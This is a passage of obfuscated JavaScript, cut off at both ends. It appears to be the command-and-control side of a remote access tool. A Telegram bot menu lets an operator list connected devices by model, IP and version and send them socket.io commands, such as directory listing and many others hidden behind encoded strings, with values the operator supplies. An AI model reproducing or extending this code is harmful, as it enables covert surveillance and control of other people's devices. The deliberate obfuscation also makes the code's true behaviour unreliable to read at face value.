                appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x29d)], _0x7aa3c7), appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x297)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x5e45b8(0x258) + _0x5e45b8(0x2ae) + _0x5e45b8(0x294) + _0x5e45b8(0x346) + _0x7aa3c7 + _0x5e45b8(0x20f), {
                    'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                    'reply_markup': {
                        'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                        'resize_keyboard': !![]
                    }
                });
            } else {
                if (_0x39eaaf[_0x5e45b8(0x354)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x297)])) {
                    let _0x3deca2 = _0x517bec[_0x5e45b8(0x3ea)], _0x3e88f9 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x29d)]), _0x30d107 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                    io['to'](_0x30d107)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                        'request': _0x39eaaf[_0x5e45b8(0x24e)],
                        'extras': [
                            {
                                'key': _0x39eaaf[_0x5e45b8(0x217)],
                                'value': _0x3e88f9
                            },
                            {
                                'key': _0x39eaaf[_0x5e45b8(0x25e)],
                                'value': _0x3deca2
                            }
                        ]
                    }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x29d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                        'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                        'reply_markup': {
                            'keyboard': [
                                [
                                    _0x39eaaf[_0x5e45b8(0x3a1)],
                                    _0x39eaaf[_0x5e45b8(0x3e3)]
                                ],
                                [_0x39eaaf[_0x5e45b8(0x37c)]]
                            ],
                            'resize_keyboard': !![]
                        }
                    });
                } else {
                    if (_0x39eaaf[_0x5e45b8(0x379)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x212)])) {
                        let _0x43c616 = _0x517bec[_0x5e45b8(0x3ea)], _0x3bd550 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                        io['to'](_0x3bd550)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                            'request': _0x39eaaf[_0x5e45b8(0x335)],
                            'extras': [{
                                    'key': _0x39eaaf[_0x5e45b8(0x3a8)],
                                    'value': _0x43c616
                                }]
                        }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                            'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                            'reply_markup': {
                                'keyboard': [
                                    [
                                        _0x39eaaf[_0x5e45b8(0x3a1)],
                                        _0x39eaaf[_0x5e45b8(0x3e3)]
                                    ],
                                    [_0x39eaaf[_0x5e45b8(0x37c)]]
                                ],
                                'resize_keyboard': !![]
                            }
                        });
                    } else {
                        if (_0x39eaaf[_0x5e45b8(0x379)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x3ed)])) {
                            let _0x252791 = _0x517bec[_0x5e45b8(0x3ea)], _0x2bee9a = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                            io['to'](_0x2bee9a)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                'request': _0x39eaaf[_0x5e45b8(0x402)],
                                'extras': [{
                                        'key': _0x39eaaf[_0x5e45b8(0x25e)],
                                        'value': _0x252791
                                    }]
                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                'reply_markup': {
                                    'keyboard': [
                                        [
                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                        ],
                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                    ],
                                    'resize_keyboard': !![]
                                }
                            });
                        } else {
                            if (_0x39eaaf[_0x5e45b8(0x354)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x40c)])) {
                                let _0x3460aa = _0x517bec[_0x5e45b8(0x3ea)];
                                appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x34e)], _0x3460aa), appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x250)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x5e45b8(0x396) + _0x5e45b8(0x252) + _0x5e45b8(0x341) + _0x5e45b8(0x34b) + _0x5e45b8(0x3d8) + _0x5e45b8(0x21a) + _0x5e45b8(0x32d) + '\x0a\x0a', {
                                    'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                    'reply_markup': {
                                        'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                        'resize_keyboard': !![]
                                    }
                                });
                            } else {
                                if (_0x39eaaf[_0x5e45b8(0x221)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x250)])) {
                                    let _0xa5296c = _0x517bec[_0x5e45b8(0x3ea)], _0x46fa42 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x34e)]), _0x5c16e6 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                                    io['to'](_0x5c16e6)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                        'request': _0x39eaaf[_0x5e45b8(0x2d7)],
                                        'extras': [
                                            {
                                                'key': _0x39eaaf[_0x5e45b8(0x25e)],
                                                'value': _0x46fa42
                                            },
                                            {
                                                'key': _0x39eaaf[_0x5e45b8(0x2e6)],
                                                'value': _0xa5296c
                                            }
                                        ]
                                    }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x34e)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                        'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                        'reply_markup': {
                                            'keyboard': [
                                                [
                                                    _0x39eaaf[_0x5e45b8(0x3a1)],
                                                    _0x39eaaf[_0x5e45b8(0x3e3)]
                                                ],
                                                [_0x39eaaf[_0x5e45b8(0x37c)]]
                                            ],
                                            'resize_keyboard': !![]
                                        }
                                    });
                                } else {
                                    if (_0x39eaaf[_0x5e45b8(0x3ec)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3a1)])) {
                                        if (_0x39eaaf[_0x5e45b8(0x362)](io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x3c5)], 0x1bc3 + -0xa7f + -0x451 * 0x4))
                                            bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x409)], { 'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)] });
                                        else {
                                            let _0x21861d = _0x5e45b8(0x313) + _0x5e45b8(0x3e9) + _0x5e45b8(0x353) + io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x3c5)] + _0x5e45b8(0x20f), _0x552593 = -0x1541 + 0xf9a + -0xb5 * -0x8;
                                            io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x35e)]((_0x58299b, _0x5483ae, _0x9193a2) => {
                                                const _0x562ec8 = _0x5e45b8;
                                                _0x21861d += _0x39eaaf[_0x562ec8(0x29e)](_0x39eaaf[_0x562ec8(0x205)](_0x39eaaf[_0x562ec8(0x29e)](_0x39eaaf[_0x562ec8(0x29e)](_0x562ec8(0x1f8) + _0x552593 + _0x562ec8(0x3e4), _0x562ec8(0x33b) + _0x562ec8(0x236) + _0x58299b[_0x562ec8(0x3a6)] + '\x0a'), _0x562ec8(0x387) + _0x562ec8(0x2e3) + '→\x20' + _0x58299b[_0x562ec8(0x272)] + '\x0a'), _0x562ec8(0x40b) + '→\x20' + _0x58299b['ip'] + '\x0a'), _0x562ec8(0x2ec) + _0x562ec8(0x2f5) + _0x58299b[_0x562ec8(0x327)][_0x562ec8(0x351)] + '\x0a\x0a'), _0x552593 += -0x1 * -0x78d + 0x1 * -0x102c + 0x8a * 0x10;
                                            }), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x21861d, { 'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)] });
                                        }
                                    } else {
                                        if (_0x39eaaf[_0x5e45b8(0x256)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3e3)])) {
                                            if (_0x39eaaf[_0x5e45b8(0x264)](io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x3c5)], 0x2220 + -0x13d8 * -0x1 + 0x16 * -0x274))
                                                bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x22f)], { 'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)] });
                                            else {
                                                let _0x1075d0 = [];
                                                io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x35e)]((_0x30f158, _0x115073, _0x3e22bd) => {
                                                    const _0x1c0603 = _0x5e45b8;
                                                    _0x1075d0[_0x1c0603(0x278)]([_0x30f158[_0x1c0603(0x3a6)]]);
                                                }), _0x1075d0[_0x5e45b8(0x278)]([_0x39eaaf[_0x5e45b8(0x225)]]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x34d)], {
                                                    'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                    'reply_markup': {
                                                        'keyboard': _0x1075d0,
                                                        'resize_keyboard': !![]
                                                    }
                                                });
                                            }
                                        } else {
                                            if (_0x39eaaf[_0x5e45b8(0x30c)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x37c)]))
                                                bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x2cb)], { 'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)] });
                                            else {
                                                if (_0x39eaaf[_0x5e45b8(0x221)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x225)]))
                                                    bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x367)], {
                                                        'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                        'reply_markup': {
                                                            'keyboard': [
                                                                [
                                                                    _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                    _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                ],
                                                                [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                            ],
                                                            'resize_keyboard': !![]
                                                        }
                                                    });
                                                else {
                                                    if (_0x39eaaf[_0x5e45b8(0x2a4)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x260)])) {
                                                        let _0x20b5f2 = io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x214)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]))[_0x5e45b8(0x3a6)];
                                                        bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x5e45b8(0x2bb) + _0x5e45b8(0x2b6) + _0x5e45b8(0x299) + _0x5e45b8(0x3bb) + _0x20b5f2 + _0x5e45b8(0x20f), {
                                                            'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                            'reply_markup': {
                                                                'keyboard': [
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2d9)],
                                                                        _0x39eaaf[_0x5e45b8(0x2bf)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2ed)],
                                                                        _0x39eaaf[_0x5e45b8(0x2ab)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x34f)],
                                                                        _0x39eaaf[_0x5e45b8(0x309)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2b1)],
                                                                        _0x39eaaf[_0x5e45b8(0x3b2)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x30f)],
                                                                        _0x39eaaf[_0x5e45b8(0x3f2)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x259)],
                                                                        _0x39eaaf[_0x5e45b8(0x3fa)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x208)],
                                                                        _0x39eaaf[_0x5e45b8(0x2c7)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2b8)],
                                                                        _0x39eaaf[_0x5e45b8(0x230)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2a5)],
                                                                        _0x39eaaf[_0x5e45b8(0x374)]
                                                                    ],
                                                                    [_0x39eaaf[_0x5e45b8(0x3a4)]],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x395)],
                                                                        _0x39eaaf[_0x5e45b8(0x31b)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x3d0)],
                                                                        _0x39eaaf[_0x5e45b8(0x393)]
                                                                    ],
                                                                    [_0x39eaaf[_0x5e45b8(0x225)]]
                                                                ],
                                                                'resize_keyboard': !![]
                                                            }
                                                        });
                                                    } else {
                                                        if (actions[_0x5e45b8(0x2f3)](_0x517bec[_0x5e45b8(0x3ea)])) {
                                                            let _0xc65239 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                                                            _0x39eaaf[_0x5e45b8(0x30c)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2d9)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x288)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x30c)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2bf)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x388)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x38b)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2ed)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x349)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x264)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2ab)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x399)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3ff)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x34f)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x39f)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x354)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x309)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x2be)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x379)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3b2)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x337)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x354)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x30f)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x1fd)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x221)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2b8)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x320)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x2af)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x230)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x2d8)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x2e0)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2a5)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x3bc)], {
                                                                'request': 'ls',
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3e5)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x374)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x3c9)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3be)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2b1)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x243)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x24a)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x213)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x3df)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x29a)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x403)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x259)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x207)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x3b3)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x30b)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x393)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x38f)]), bot[_0x5e45b8(0x373)] = _0x39eaaf[_0x5e45b8(0x3de)](ssage, data['id'], _0x39eaaf[_0x5e45b8(0x3a2)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3cd)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3d0)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], ''), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x37f)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x40e)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3fa)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x212)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x32c)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
